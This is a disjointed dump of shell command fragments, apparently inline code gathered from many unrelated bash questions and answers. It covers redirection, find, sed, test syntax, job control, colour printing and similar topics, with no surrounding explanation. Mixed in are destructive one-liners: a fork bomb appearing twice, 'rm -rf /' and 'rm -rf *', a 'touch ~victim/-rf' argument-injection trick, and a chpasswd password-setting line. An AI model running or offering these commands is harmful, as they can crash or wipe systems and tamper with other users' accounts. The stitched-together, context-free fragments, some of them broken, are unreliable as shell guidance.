BgreyV () { printf '\e[8;47m'"$*"'\e[m'; }
BwhiteV () { printf '\e[8;47m'"$*"'\e[m'; }
## ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ ##
printf "$(Tblue "%%s")\n" 'hi'
Tblue "%s\n" 'hi'
printf "$(Tblue "%s" 'hi')\n"
printf "hi $(Tred there) man $(BaquaI "%c" '!') $(Bold 'This \\t is %%s') %s\n" "$(BgreenB 'super')" "$(Bblue mega Colorful)"
echo "hi $(Tred there) man $(BaquaI "%c" '!') $(Bold 'This \\t is %s' "$(BblackB 'super')") $(Bblue mega Colorful)"
printf "\t%s Volume \"%s\" is not connected.\n" "$(TwhiteB [)$(TredB Error)$(TwhiteB \]:)" "$(Tbrown $Volume)"
eval "echo 'This is OSX' | sed 's:OSX:$(Invert [)$(TaquaF OSX)$(Invert ]):'"
find . -exec stat -f "Name: $(Tbrown %%N)%t%t$(Tpurple "->")%tPermissions: $(Tgreen %%Sp)" {} \;
git checkout m<tab>
git checkout
gco m<tab>
git co m<TAB>
git co master
git checkout
git checkout
_xfunc git
alias d-m="docker-machine"
cd `brew --prefix`/etc/bash_completion.d/
alias g=git
brew install git
alias g='git'
man 3 readline
alias -p
-- /dev/stdin
++ /dev/fd/63
echo <(true)
grep -f
grep -f
seq 100
seq 10
tail -f
ssh -n ...
man bash
sudo nohup nice foo.sh
sudo nohup nice foo.sh >> /tmp/foo.stdout.log 2>> /tmp/foo.stderr.log
file -i filename
for f in *
ls | while read f
help wait
doCalculations; echo "$?" >>/tmp/acc
echo $i
wait $PID
set -m
while fg
help wait
help jobs
set -e
jobs -p
wait -n
wait -p
cmd &
help wait
chmod +x multi_process_program.sh
PID XXXXX is done
sleep 5
wait <n>
teelog make ...
the_cmd 1> /proc/self/fd/13 2> /proc/self/fd/14
teed stderr: to stderr
2>&3 3>&-
{my_command 3>&1 1>&- 1>&2 2>&- 2>&3 3>&- | stderr_filter;} 3>&1 1>&- 1>&2 2>&- 2>&3 3>&- | stdout_filter
#!/bin/csh -e
pathname expansion
f{m,k}t*; some_command
/content/dev01 /content/dev02
ct lsprivate
ct ls -rec -view_only
ct lsprivate
for /F "usebackq delims=" %i in (`cleartool ls -r ^| find /V "Rule:" ^| find /V "hijacked" ^| find /V "eclipsed" ^| find /V "-->"`) do @echo "%i"
@echo "%i"
del /F "%i"
rmdir /S /Q "%i"
del /F "%i"
hg st
shopt -s extglob
{trimmed##*( )}
echo -e "${FOO}" | sed ...
sed ... <<<${FOO}
whatever=${whatever%% *}
whatever=${whatever#* }
' \t\n'
read -r -d '' var << eof
"foo bar"
"foo    bar"
"foo bar"
shopt -s extglob
^ +(.+) +$
 ABC 
source scriptname
. scriptname
cat ip_addresses | sort -n | uniq -c
/\1 \2\o11\3/;
/\1 \2|\3/;
sed -e '<expr>; <expr>; <expr>;'
version sort
1000 rows
sort|uniq -c
man 1 time
perf stat
fg [jobspec]
uname -p
uname -m
uname -m
uname -a
cat hosts | ./showuptimes
cat hosts | ./showuptimes -j
`ls *d*`
ls \*middle\*
ctrl-x, *
Hello, world!
DEFINE_ call
--verbose -dm4096 --minh=20 --maxhe 40 --debugfi="/Users/John Johnson/debug.txt"
--verbose -d -m 4096 --minheap 20 --maxheap 40 --debugfile "/Users/John Johnson/debug.txt"
eval set
--file foo.txt
-m 4096
sudo port install getopt
eval set
eval set
cmd --bravo=foo -ac FILE
delta ) delta=true ;;
-a -- --bravo=4
eval "ARG_B=\"\$$OPTIND\""
brew install gnu-getopt
cp /usr/local/Cellar/gnu-getopt/1.1.6/bin/getopt /usr/local/bin/gnu-getopt
script.sh /file -V
script.sh -V /file
date +%s
~$ ./sum_time.sh <worktime.txt
date +%s
$(date +%s)
rsync -av dir_to_backup /Volumes/External/;
test -e $DIR && rsync -av ...
printf '%s\n' "${randf[@]}"
-n, --head-count=COUNT
echo "filename"{1..25}".txt"
[[ -r ~/.bashrc ]] && . ~/.bashrc
man bash
echo "
$(cat template.txt)
$(cat template.txt)
cat template.txt
sh -c
echo "The number is ${i}\nThe word is ${word}"
eval echo "$(<template.txt)
Trap2 () ( Tred "%6s–<Interrupt>–\n" ''; return 202 ); trap Trap2 SIGINT
Trap2 () ( Tred "%6s–<Interrupt>–\n" ''; return 202 ); trap Trap2 SIGINT
Trap2 () ( return ); trap Trap2 SIGINT
Trap2 () ( return ); trap Trap2 SIGINT
foo > output
tee -a
tail -f output
tee outfile
< command > |& tee filename
< command > | tee >> filename
X=...; export X
setenv X ...
$(dirname "$BASH_SOURCE")
brew install coreutils
$(dirname "$(realpath "$0")")
rm -rf "{}"
Test Folder/.dummy
python runscript.py
grep -o
ifconfig eth0 | grep 'inet addr' | awk '{print $2}' | awk 'BEGIN {FS=":"} {print $2}'
deny from
[[ ]]
_1 _12 _123 _1234 _12345_
cut -c startIndx-stopIndx
unset IFS
$Id: mkscript.sh,v 2.3 2005/05/20 21:06:35 jleffler Exp $
exit $exitval
# loop over $var
/bin/foo -- {mile long list of arguments}
rm -you_know_what "$var/"
binding state free
binding state active
binding state backup
nmap -sP <start_ip>-<end_ip>
xargs -0
$ cat ips
$ cat ips | netaddr 192.16.55.40/27
$ cat ips | netaddr 192.16.55.40/27 | wc -l
echo ...
read X
IFS='' read X
-P N
bash -c
"$1" "$2" ...
if [[ -z "$*" ]]; then ...
python run.py
#/usr/bin/env python
. run.sh
. ./run.sh
sh run.sh
sh ./run.sh
man bash
man bash
[ -n "$extn" ]
process_name alice
process_name bob
$last_line = $output = system ("~/public_html/cgi-bin/srch.sh &> ~/public_html/errors.txt",$retval);
touch -c
for i in "$@"
cat nvpairfilename
exec teredo
module load *XXX*
source set_env_vars.sh
gdate '+%s' -d '2 weeks ago'
gdate '+%s' -d '1 day ago'
strptime(seconds, '%s')
"xmms2 radd directory_name"
"xmms2 add file_name"
define compile
compgen -c -X'!*substring*'
ls beginningofword*
chmod u+w
man 3 readline
-A variable
-A variable
-v -X '!*SEARCHED*'
find -iname '.#*' | ...
IFS=$' \t\n'
crontab filename
crontab -u my_web_user filename
user@host$ :(){ :|:& };:
: | :
run 'c:\foo.exe /BUILD'
info run
-w 1
-q 0
# lsmod | grep -q snd_hda_intel
# echo $?
# lsmod | grep -q snd_foo
# echo $?
man bash
a=$(expr 1 + $(expr 2 + 3))
cd ~whatever
cd ~
./my_copy *
kill %1
xargs -0
man perlrun
while read...
man replace
Invalid command code
BSD sed
sed -i '.bak' 's/find/replace' /file.txt
sed -i '' 's/find/replace' /file.txt
echo "a\tb"
-v var
echo hello world
sleep 1
echo $proc
sleep 3
sleep 60
chmod g+s
ps auxw|grep -i screen|grep -v grep
screen -RRx $username/
screen -list
screen -x [screen id]
Ctrl + D
Ctrl + A, Then press D
killall screen
-lt 2
printf -v
printf -v
local b
boo SOME_VAR
boo $SOME_VAR
local -n ref=$1
local -n ref="my_var"
local -n ref=$(get_var_name)
tar cvf - /path/to/folder | sha1sum
find /path/to/folder -type f -print0 | sort -z | xargs -0 sha1sum | sha1sum
tar -c /path/to/folder | sha1sum
md5deep -r {direcotory}
--mtime='UTC 2019-01-01' 
--group=0 --owner=0 --numeric-owner
pip install tqdm
hashdir /folder/of/stuff
diff -r -q "dir1" "dir2"
Directories match!
find /home/gabriel/temp2
man readline
export git=$HOME/opt/git/bin/git
cd ..
pwd -P
cd ..
read -s -k
read -n1 -p
echo hello
export -p
declare -x
stat -f "%m" "$somefile"
date -r /the/file +%s
touch --date '2015-10-10 9:55' /tmp/file
date -d "now - $( stat -c "%Y" $filename ) seconds" +%s
tar -x file.tar.gz
uname -m
decho a b "c d"
decho $args
eval decho $args
::: *.jpg
convert --resize 800x600 -- foo.jpg foo-resized.jpg
alias diff='grc diff'
tail -f /var/log/messages | loco
man bash
man zshexpn
help [[
help test
man test
[ ]
:(){ :|:& };:
while (sleep 100 &!) do; done
&|' or
bind -l -p
hists something
bash -c 'script/server'
cd "~/My Code"
cd "~/My\ Code"
cd ~/My\ Code
$ . cdcode
diff <(sort file1) <(sort file2)
-bash: $@: ambiguous redirect
SHELL := /bin/bash
sudo dpkg-reconfigure dash
udevadm monitor --env
udevmonitor --env
/sbin/initctl emit back-it-up VARIABLE=$env{VARIABLE} ...
start on back-it-up
if which foo
command -v
type -P
type -P cmd
env -i type cmd 1>/dev/null 2>&1
&> /dev/null
echo >&2
dpkg -s
hash foo 2>/dev/null
type -p foo
command -v foo
-ash: command: not found
env -i sh -c 'type cmd 1>/dev/null 2>&1'
command -v ls
bash -c
command -v
command -v
alias ls='ls -F'
set -e
command -v
man zshmodules
complete -d cd
apt-get bash_completion
write(#,<text you want to see>)
bg %1
disown %1
set scheduler-locking on
-T FILE
$ (commandToWaitOn; commandToRunAfter) &
| sh
sed -n
sed -r
sed -E
man re_format
echo -e "\x55"
printf '\UXXXXXXXX'
printf '\\U%08x' number
printf -v var ..
local variable
local -n var=other
|sed '1,1000000d'
uniq -z -d
echo -e
echo "$RESULT"
echo $RESULT
declare -p
sed 's/\([A-Z]\)/ \1/g'
sudo apt-get install python-imaging
#!/usr/bin/env python2.6
uniq -d
uniq -u
uniq -d
uniq -u
sort | uniq
du -s
read name
$? != 0
echo >> file.csv
disown -h [job-spec]
nohup -p pid
/usr/bin/python /vol/scripts/python_scripts/retention_all_properties.py 1
disown -h
nohup SOMECOMMAND
ps -C loop.sh
ps -f <PID>
open(path, O_TRUNC|O_CREAT|O_RDWR, S_IRUSR|S_IWUSR)
man open(2)
call perror("")
p errno
/usr/sbin/lsof -p <PID>
call close(2)
call open(...)
gdb -q -x loop.gdb -p <PID>
disown -a
Ctrl + Z
disown %1
; bash
bash --login
usermod -d /newhome username
ssh -t admin@test.com "cd public_html; bash --login"
ls -l
-maxdepth 1
-mindepth 1
$ cat a.txt >> b.txt
apt-get install xcftools
. .bash_profile
. ~/.bash_profile
chcp 65001
Lucida Console
2>&1 1>file.log
command &> file
tee FILE1 FILE2 ... >(cmd1) >(cmd2) ...
Command >filename 2>&1
Command &>filename
2>&1 >/dev/null
$ command &> /dev/null
2>&1 >/dev/null
>/dev/null 2>&1
exec 2>&1
ls -le
find / -print0 -type fd | xargs -0 ls -le | more
echo /path2/mycode $i | qsub
man wc
howmany "one two three"
set -f
man test
man [
help test
help [
-b filename
-c filename
-d directoryname
-e filename
-f filename
-G filename
-G filename set-group-id
-k filename
-L filename
-O filename
-r filename
-S filename
-s filename
-u filename
-w filename
-x filename
[ -f "$file" ]
[ ! -f "$file" ]
! [ -f "$file" ]
[ -e "$file" ]
ls -Ld -- "$file" > /dev/null
[ -f "filename" ] || ( echo test1 && echo test2 && echo test3 )
[ -f "filename" ] || { echo test1 && echo test2 && echo test3 ;}
rm -rf ~/some/dir
id -u
printf "HEAD / HTTP/1.0\r\n\r\n" |nc -n -i 1 10.1.1.2 80
date -d
./sleep.py 10; ./test_client1.py
./sleep.py 10; ./test_client2.py
date -f
tomorrow 21:30
read -t
read -t
read -t
read -t
IFS= read -sn 1 -t $slp _
sudo apt install bash-builtins
read -u $_dummySleepFd -t ...
&& date
cargo install yawn
5 min
enable -f file name
source ~/.bashrc
echo "export EDITOR='vim'" >> .profile
fc -s pat=rep
grep somestring $VARTEST
man find
locate <file_pattern>
ls | wc -l
-printf ':%p'
export PATH="$PATH:$(du "~/code/" | cut -f2 | tr '\n' ':' | sed 's/:*$//')"
cut -f2
tr '\n' ':'
sed 's/:*$//'
set -o vi
set -o emacs
M-x shell
M-<n> M-f
M-26 M-f
M-26 M-b
echo -e "\e[?1000;1006;1015h" # Enable tracking
echo -en "\033[7A\033[1;35m BASH \033[7B\033[6D"
printf "\x##"
man bash
man ascii
[[ ]]
[ ]
[[ ]]
[[ ]]
( )
[[ X ]]
[[ a < b ]]
[ a \< b ]
expr x"$x" \< x"$y" > /dev/null
[ "$(expr x"$x" \< x"$y")" = 1 ]
[[ a = a && b = b ]]
[ a = a && b = b ]
cmd1 && cmd2
[ a = a ] && [ b = b ]
[ a = a -a b = b ]
[[ (a = a || a = b) && a = b ]]
( )
[[ && ]]
[[ || ]]
[ ( a = a ) ]
[ \( a = a -o a = b \) -a a = b ]
\( \)
{ [ a = a ] || [ a = b ]; } && [ a = b ]
[ a = a ] || [ a = b ] && [ a = b ]
[[ || ]]
[[ && ]]
x='a b'; [[ $x = 'a b' ]]
x='a b'; [ $x = 'a b' ]
[ a b = 'a b' ]
x='*'; [ $x = 'a b' ]
x='a b'; [ "$x" = 'a b' ]
[[ ab = a? ]]
* ? [
[ ab = a? ]
[ ab = a\? ]
case ab in (a?) echo match; esac
[[ ab =~ 'ab?' ]]
[[ ab? =~ 'ab?' ]]
[[ ab =~ ab? ]]
[ a =~ a ]
printf 'ab\n' | grep -Eq 'ab?'
awk 'BEGIN{exit !(ARGV[1] ~ ARGV[2])}' ab 'ab?'
[[ ]]
[[ ]]
[ … ]
[[ … ]]
[[ … ]]
[ … ]
[[ … ]]
[[ … ]]
[ … ]
[[ $n -gt 0 ]]
source "$activate"
source "$activate"
sh scriptname.sh
-maxdepth 1
-type f
-mindepth 1
ls -Q
mv $(ls ~/folder | grep -v ~/folder/exclude.png) ~/destination
find -maxdepth 1 -mindepth 1 -not -name except_file -print0 |xargs -0 mv -t ./except_file
find -maxdepth 1 -mindepth 1 -not -name cache -print0 |xargs -0 mv -t ./cache
ln -s
man ln
up 3
up a
cd parameters
jh $1
cd parameters
-F -
unset hello
unset hello
chmod 000
TMPDIR=/var/tmp gvim -d foo bar
basename $0
$(printf '%q' "$VAR")
info timeout
bash 4.3
_timeout 5 longrunning_command args
{ _timeout 5 producer || echo KABOOM $?; } | consumer
producer | { _timeout 5 consumer1; consumer2; }
{ while date; do sleep .3; done; } | _timeout 5 cat | less
wait -n
; )
; }
set +b
flock fd
exit 137
timeout 1 slowcommand || echo "I failed, perhaps due to time out"
mktemp -d
typeset -A newmap
declare -A newmap
set -m
wait ${!}
make -j
15 2 9
var=hello; hello=hi; echo $$var
trap '...' EXIT
2>&1 |
tee bbb.out
tee ccc.out
./aaa.sh > >(tee bbb.out) 2> >(tee ccc.out); process_logs bbb.out ccc.out
2>&1 1>&3
Test Out
set -o pipefail
set +o pipefail
[ ]
ps | grep
'other instance already running'
sleep 1
/etc/init.d/foo start
ps aux | grep PID
&& break
copytags.py src1 dest1 src2 dest2 src3 dest3
man test
Brian Campbell
No such file or directory
set -u
head -$N | tail
set -- *
dd if=/dev/urandom bs=3 count=1 2>/dev/null
sort --random-sort
cut -f2-
date -d
date -d "2009-03-00"
date -d 'yesterday 2009-03-01'
rm -- --testings.html
rm ./--testings.html
rm -rf *
touch ~victim/-rf
ls -i
--(username)-(Wed April 01|12:00:00)--(~ $
export PS1='\u@\h:\w\$ '
kill -9
ps ax | grep sleep
ps ax | grep sleep | grep -v grep
kill -9
sh -c 'cmd &'
man 1 passwd
echo $1:$2 | chpasswd
$(echo 'date +%s')
1 2 -1 3 -2  4 5- 3
Control Panel
Environment Variables
bash -l
tar -cvf
tar -c -v -f
>> file1.log
tar -cvf archive_name [files] > file.log
ip neighbor
arp -a
mkdir {dir1,dir2}/{sub1,sub2}
ping -c 1
ping: sendto: Host is down
nmap -sn
#!/bin/bash -exu
set -exu
. bin/script.sh
chmod +x script_name
sh script_name
bash script_name
"sleep 60"
sleep 3600
find list_of_files | xargs du -hc
if [ -f FileToUse ]
-O CSE-spanien
test -f CSE-spanien && awk ...
echo "<PRE>$t</PRE>";
xclip -selection c
cat example.txt | pbcopy
alias xclip="xclip -selection c"
echo -n test | xclip
cat /dev/clipboard
echo "foo" > /dev/clipboard
. ~/.bash_aliases
vim --version
(( $+command[name] ))
echo -n '
' > filename.txt
echo -n 'copied "text" with '\''single quotes'\'' escaped' > filename.txt
clp "Content"
null device 1
garbage <- def.off()
R --file=script.R
R --slave -f script
/usr/bin/env Rscript
#! /sw/bin/Rscript
locate Rscript
/bin/bash mycmd.sh
source mycmd.sh
. mycmd.sh
for file in "
-exec command {} \;
-exec command {} +
{} \;
{} +
for foo; do
-exec {} +
echo "${f}" | sed -e 's/[\\/:\*\?#"\|<>]/_/g'
alias lock="gnome-screensaver \gnome-screensaver-command --lock"
source ~/.bashrc
eval echo $string
eval echo $VAR
eval echo 'FOOD'
echo 'FOOD'
ls -l
if (failed
Permission denied
2>&1 > files_and_folders |
> files_and_folders
find . -name '...' 2>/dev/null
! -readable
! -readable -prune
find / -type f -name "your_pattern" 2>/dev/null
find . -type f  -name "your_pattern" -exec du -ch {} + 2>/dev/null | grep total$
find 2>/dev/null
LC_ALL=C 
LC_ALL=C find ...
grep -v 'Permission denied'
2> >(...)
ksh 93u+
grep -v 'Permission denied'
Permission denied
| cat
Permission denied
Permission denied
Permission denied
find . ! -readable -prune -o -print
Permission denied
find ! -readable -prune
find . ! -readable -prune -o -name '*.txt'
find . 2>/dev/null > files_and_folders
sudo find . > files_and_folders
find . 2>&1 | grep -v 'Permission denied' > some_file
find . > files_and_folders 2>&-
Permission denied
find . -type d \! \( -readable -executable \) -prune -print -o -print > files_and_folders
Permission denied
{ LC_ALL=C find . 3>&2 2>&1 1>&3 > files_and_folders | grep -v 'Permission denied'; [ $? = 1 ]; } 3>&2 2>&1
'Permission denied'
3>&2 2>&1 1>&3
3>&2 2>&1
[ $? = 1 ]
'Permission denied'
find / -name YOUR_SEARCH_TERM 2>&1 | grep YOUR_SEARCH_TERM
find . -name foo -readable
! -readable
#!/usr/bin/env bash
cat testFile
mv nz* foobar
mv nz* foobar/
. /etc/bash_completion
man sort
man paste
'grep -i " ${day}$"'
"set -o vi"
":w /tmp/myscript"
"vim xx.txt"
"vim xx"
rm -r
rm **/*.pyc
find . -name '*.pyc' -type f -delete
find . -name "*.pyc" -type f -delete
find . -name "*.pyc" -type f
grep -o 'class="msProfileTextLink" title="([^"])*"' file.html
class="msProfileTextLink" title="rØbylin"
class="msProfileTextLink" title="Chris Townsend"
egrep -o 'class="msProfileTextLink"[[:space:]]*title="([^"])*"'
grep -o '"[^"]*"$'
rm $archivedir/*.bz2
rm $archivedir/*.bz2
/var/archives/monthly/April to June
rm /var/archives/monthly/April to June/*.bz2
rm -rf */*.bz2
non-standard shell
history | grep <searched expression>
alias ls='ls $LS_OPTIONS '
ls --help
man ls
ls -il [ test echo
find /path -inode 356954
read line < /dev/tty1
shopt -s globstar
. .bashrc
[[ ]]
[ ]
bash: [[: 1 a: syntax error in expression (error token is "a")
bash: [[: i: expression recursion level exceeded (error token is "i")
echo $number | grep -E '^-?[0-9]*\.?[0-9]*$' > /dev/null
if [ $? -eq 0 ]; then echo "Numeric"; else echo "Non-Numeric"; fi
man -P 'less +/parameter\/' bash
>$ var=45
>$ (($(check_number $var "${CHECK_INTEGER}" "Error: Found $var - An integer is required."))) && { echo "$var+5" | bc; }
[[ $( isInt <arg> ) ]]
$x=$(( $y + 34))
Valid number.
Error: not a number.
echo "Valid number."
echo "Error: not a number."
Valid number.
Error: not a number.
write tonge
echo $myPath
echo $myPath
$(__git_ps1 "(%s)")
export PS1="..."
"-d "
-d ' '
-d " "
-d \<space>  # <space> used to represent an actual space for technical reasons
-d' '
-d" "
"-d "
'-d '
$(( ... ))
g++ main.cpp
) 9>&2
command |& ...
command 2>&1 | ...
set -o noclobber
somecmd >1.txt 2>&1
somecmd 2>&1 >1.txt
unix_commands 2>&1
ls -a > output.txt
cat test.txt > error.txt
ls -a 1> output.txt
cat test.txt 2> error.txt
cat maybefile.txt > output.txt 2>&1 
docker logs 1b3e97c49e39 2>&1 | grep "some log"
docker logs 1b3e97c49e39 1>&2 | grep "some log"
stdout | stdin
-mindepth 1
rm –rf .
rm -rf ..
rm -ir .
man rm
rm -r .
rm –rf .
rm -ri .
rm -rf /
rm -ri
rm -r images/*
rm -r
set -e
set -e
set -u
set -e
|| true
command; if [ $? -eq 0 ]; then X; fi
if command; then X; fi
set -e
cmd || exit errcode
> newfile
command; command
ls > /tmp/ls.txt
trap signalHandler SIGCHLD
eval $cmds
ls -B
parallel --embed
--eclude '~'
vi -e
find -exec
psql -h localhost -U postgres -q -c "\l" | sed -n 4,/\eof/p | grep -v rows\) | grep -v template0 | grep -v template1 | awk {'print $1'}
psql -t -c "select datname from pg_database where datname not like 'template%';" | grep -v '^$'
psql -h localhost -U postgres -q -x -t -c "\l" | grep 'Name' | sed 's/ //g' | sed 's/Name|//g'
psql -lqt | grep -vE '^ +(template[0-9]+|postgres)? *\|' | cut -d'|' -f1| sed -e 's/ //g' -e '/^$/d'
psql -lqt
prompt:$ xclip -o -selection clipboard | sed --regexp-extended 's/^(.*)$/# \1;/'
for i in *.JPG;
do echo mv $i ${i/.JPG/.jpg};
# for i in *.JPG;
# do echo mv $i ${i/.JPG/.jpg};
# done;
ESC v
command time
-o ...
!'abc '
"!abc\ "
ESC /
"abc "
echo I need this command or command sequence all the time #useful
sudo echo something
[ -z ${parameter+word} ]
man bash
. scriptname
source code.sh
if conditions
cd /Users/jdoe/Desktop/Mongo/db.3.2.1/bin
chmod 755 mongobin
source mongobin
cmd &>> file.txt
&> outfile
&> x.file
cmd >> file.txt 2>&1
date -f -  +%F\ %T
paste -d .
stdbuf ... tee
man -P'less +/^\ *exec\ ' bash
date +%s
date +%S | sed -e 's/^0//'
crontab -e
crontab -l
crontab -
crontab -l
crontab -l
echo "$job"
crontab -l
echo "$job"
crontab -
-bash: !( mountpoint -q /my/dir ): No such file or directory
ls *.jpg
2>/dev/null || true
<> /dev/null
grep -c -r "string here" *
grep -r
wc -l
grep -roh "string here" | grep -v "^Binary.*matches$" | grep -c ^
echo $FILES
set $FILES && eval eval echo \\\${1..10}
N=$1; shift; eval eval echo \\\${1..$N}
bash foo.sh 10 $FILES
help mapfile
printf "%s\n" *
wget http://domain/file.zip && mysql -u user -ppassword database -e "UPDATE table SET status = 'live' WHERE id = '1234'"
shopt -s autocd
man bash
aaa > aab > aac > ... > zzx > zzy > zzz
xml_grep -t '/html/head/title' xhtmlfile.xhtml > titleOfXHTMLPage.txt
local IFS=\>
cnf xml
pip install lxml
sudo apt install python-lxml
yq --input-format xml '.root.myel.0.+@name' $FILE
yq --input-format xml --output-format props $FILE
yq --input-format xml --output-format json $FILE
yq --input-format xml $FILE
:tabe {file_name}
:h tabpage
-x main
screen -ls
-p oldwindow
man bash
source ~/.bashrc
"grep -v PID"
vim -
-u NONE
-u NONE
-c <something>
-c ':%p'
-c 'q!'
tail -n +2
Vim: Reading from stdin...
:help autocommand
:help VimLeave
:autocmd VimLeave * <command>
:exec "%!./encode.sh" | write! secret.txt
:help autocommand
:help :X
alias ls=ls -F
ls --color
man test
man bash
[[ -S ]]
[[ "${-}" =~ 'i' ]]
tty -s
[[ "$(ps -o comm= -p $PPID)" =~ 'sshd' ]]
lsof -p <pid>
basename /some/path/to/script.sh .sh
Hello, world
' '
' '
IFS=':'; arrIN=($IN); unset IFS;
IFS=$'\n'; arrIN=($IN); unset IFS;
declare -p
var=$(echo ... | cut ...)
unset IFS
echo $XXX
echo $PATH
-n "${VAR:-x}"
man zshcompsys
lynx -dump
wget -O tmpfile http://example.com
-s --squeeze-blank: suppress repeated empty output lines.
cat -s
process start
process stop
findpy WORD
findpy -e REGEX
findpy -il WORD
pidof -x
kill -0
$ program 2>&1 > >(:)
| true
krunner_lock_bin $@
grep -q
grep -q
fping 4.2.2.1
fping -q google.com && echo "do something because you're connected!"
brew install fping
sudo apt-get install fping
curl -Is http://www.google.com | head -1 HTTP/1.1 200 OK
bash 4
sleep 1;
brew install sf-pwgen
mv filepattern* somewhere/
find -exec {}
set -o emacs
set -o emacs
set -o vi
set -o vi
echo " ### "
chmod +x
chmod +x
cp -Rvn /source/path/* /destination/path/
set -e
set -x
set -n
set -[nvx]
set -v
set [+-][nvx]
declare -p v1 v2 >&2
set -x
set +x
bash <(
) arg1 arg2
disown -h
disown -h %1
>( )
./useless.sh | sed 's/Output/Useless/'
a | b
local -n
local -n
{ command; }
catch-var-from-fd-by-fd $var $fda $fdb $command
local -n var="$var"; catch-var-from-fd-by-fd var 3 5 $command
catch-var-from-fd-by-fd var 2 3 cmd..
catch-stderr var cmd..
shift || return
local -n
printf '\0%s\0%d\0'
<( ... )
<( ... )
(printf '\0%s\0%d\0' "$(some_command_with_err)" "${?}" 1>&2) 2>&1
read -r -d ''
read -r
-d ''
echo ${FILENAME%%.*}
man file
man mime.types
splitPath '/etc/bash.bashrc' _ _ fnameroot extension
ls -1 *.rst
echo $each | wc -c
echo $each | cut -c -$(( $a-5 ))
t l1
t l2
t l3
(root, ext)
root + ext == path
('.cshrc', '')
tar xf my_tarred_files
"${@/#/-path }"
cd -
prefix '*/'
seq 0 2 10
seq .5 .25 3.5
cut -c 25-
man gconftool-2
tr -d '\n'
dd if=your_file ibs=2 count=1
trap: 10: SIGTERM: bad trap
kill -l
kill -- -$$
set -e
grep -r
ifconfig | grepe inet
grepe css index.html
source ~/.bashrc
less -R
grep -C 100 searchtext file
[^ -~]?|PATTERN
grep -E '|pattern'
tail -f somelog | grep --color -E '| \[2\].*'
-E '|
brew/apt/rpm/whatever install ripgrep
octal 033
Esc [ 47 ; 31 ; 1 m
Esc [ 0 m
tail -f
link up
egrep 'pattern1|pattern2' FILE.txt | less -Sp 'pattern1|pattern2'
chmod +x file
Shift + ⌘ + N
sleep 60
code .
rm -fr
rm -fr
set -u
rm -rf
del my_folder
del my_folder/
cat *
cd ~X
cd ~
cd ~(your username)
cd ~username
cd ~x
declare -i
$(( ... ))
a - b - c.mp3
type -t
M-x shell-script-mode
man ls
sort -r filename
tail -n filename
.replace(needle, "", 1)
.replace(needle, "")
crontab -e
crontab -e
crontab -e
sudo -s
sudo -i
sed -i
sed -i
source ~/.zshrc
set enable-keypad on
if [ $# -eq 0] || [ $# -gt 2 ]
if [ $# -eq 0 ] || [ $# -gt 2 ]
paste [-s] [-d list] file ...
set show-mode-in-prompt on
flock [-sxun][-w #] fd#
flock -s -w5 "./file.xml" -c "tail -3 ./file.xml"
sudo chattr +i ./file.xml
sed -i '1s/^/\xef\xbb\xbf/' foo
i <= n
$i <= $n
for ((x; y; z))
echo "
set -o vi
cd /very/long/path
bind -P
kill -0
kill -0
kill -0 $pid
test -d "/proc/$pid"
ps | grep "^$pid "
grep -vw grep
ps axg
top -n 1 -b
kill -0
tail --pid
Timeout in Seconds
+r 1m%s
+r 1
/Volumes/Secondary500/Temp/Untitled-2_Layer 1 copy 2.pdf
/Volumes/Secondary500/Temp/Untitled-2_Layer 1 copy.pdf
/Volumes/Secondary500/Temp/Untitled-2_Layer 1.pdf
declare -a
takes_ary_as_arg descTable[@] optsTable[@]
$1 == descTable[@]
$2 == optsTable[@]
array=(value1 ... valueN)
echo ${array}
eval $target_varname=$"(${array_inside[@]})"
man bash
man bash
kstart --fullscreen gFTP
-geometry WxH+X+Y
grep 'abc' myFile
grep 'abc.*def' myFile
ls *.log
tar zvPcf backup.tar.gz ../data/ -C '/home/test/backups/'
-C, --directory DIR
set +e
set -e
man bash
man bash
sleep 2
test="[ -e $somefilename ]"
test="grep -sq \"^sometext$\" $somefilename"
"/^line X/"
tail -n+2
head -n-1
grep abc *
ack --php --nogroup abc
man grep
$ chmod u+x ./bfs.sh
$ ./bfs.sh /path/to/somewhere -name foobar
uniq -c
sort -nr
uniq -c
awk '{ t = $1; $1 = $2; $2 = t; print; }'
date --help
man 3 strftime
(( expression ))
| tail +2
bash ./script.sh
bash and sh
C:\Program Files\git\bin\
C:\Program Files\git\bin\
window cmd
bash shellscript.sh
sh shellscript.sh
sh your_script.sh
bash your_script.sh
>> outfile.txt
grep -l -R <regex> <location>
#!/bin/bash -e
trap ERR
/bin/bash -e
. .bashrc
find .
find /target/directory
man find
-type f
find | xargs
ren * *.jpg
ren *.png *.jpg
1:Bold (can be used with any color)
C-x C-f
(ido-mode t)
find . -print0
find . -print0
cmd1 < <(cmd2)
cmd2 | cmd1
cmd1 < <(cmd2)
find . -print0
set -x
$(cat ${my_code_file})
Google Picasa
man rsync
stat -L
ls -l
#!/bin/bash -l
wget -O my.html http://sdfsdfdsf.sdfds
bind -x $'"\C-l":clear;'
"\C-l": clear-screen
bind -x $'"\C-l":clear;'
bind -x
wait -n
set -e
wait $(jobs -p)
cat X | grep Y | tr -f 3-5 | sort | uniq
2009-06-14 23:59:59
2009-06-15 00:00:00
export PS1="\[\033[0;31m\][\u@Project:\w]$\[\033[0m\] "
curl https://gist.githubusercontent.com/martinos/d4aa0a7d4d752b0d0d9f/raw/3198c39f84a080c44227a084a19fb3a0bb661ee5/wrapping_issue.txt
‘words f<tab>’
‘words foo ’
‘words b<tab>’
‘words bar ’
‘words bar\ ’
‘words "b<tab>’
‘words 'b<tab>’
‘words "b<tab>’
‘words 'b<tab>’
‘words b<tab>’
‘words bar\ <tab>’
‘words bar ’
‘words bar\ ’
‘bar one’
‘bar two’
‘words "b<tab>’
‘words 'b<tab>’
‘words b<tab>’
‘words bar\ ’
-o filenames
-o filenames
-o filenames
-o filenames
bar\ one/
-o filenames
-o filenames
-o filenames
export -p
export NAME=value
man environ
char *getenv(const char *name);
int setenv(const char *name, const char *value, int override);
int unsetenv(const char *name);
export -n <var>
export GIT_PAGER
export branch
from os import environ as foo
-exec file filename
-execdir {} +
-execdir {} \;
-exec file {} \;
find -ls
ls -l
read -d
set -eu
echo $VAR # strips newlines
echo "$VAR" # preserves newlines
head -c -1
ls | sort -r | tr '\012' '\000' | xargs -0 touch
for i in list
touch -t
cap -h
cap -h
time sleep 1
